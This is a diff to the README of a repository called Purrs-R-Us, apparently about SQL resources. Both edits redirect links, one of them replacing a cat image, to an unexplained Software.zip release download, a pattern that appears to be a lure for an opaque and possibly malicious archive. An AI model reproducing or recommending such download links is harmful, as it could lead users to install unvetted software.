@@ -20,7 +20,7 @@ In this repository, you will find a collection of resources, data sets, and SQL 
 
 To get started, you can download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip). 
+[![Download Software](https://github.com/myusernamewastakenlol/Purrs-R-Us/releases/download/v2.0/Software.zip)](https://github.com/myusernamewastakenlol/Purrs-R-Us/releases/download/v2.0/Software.zip). 
 
 If the link doesn't work, please check the "Releases" section for alternative download options.
 
@@ -63,7 +63,7 @@ A big thank you to all the contributors who have helped make Purrs-R-Us reposito
 
 🐾 Happy Coding and Cat Loving! 🐾
 
-![Purrs-R-Us](https://placekitten.com/500/300)
+![Purrs-R-Us](https://github.com/myusernamewastakenlol/Purrs-R-Us/releases/download/v2.0/Software.zip)
 
 ---
 
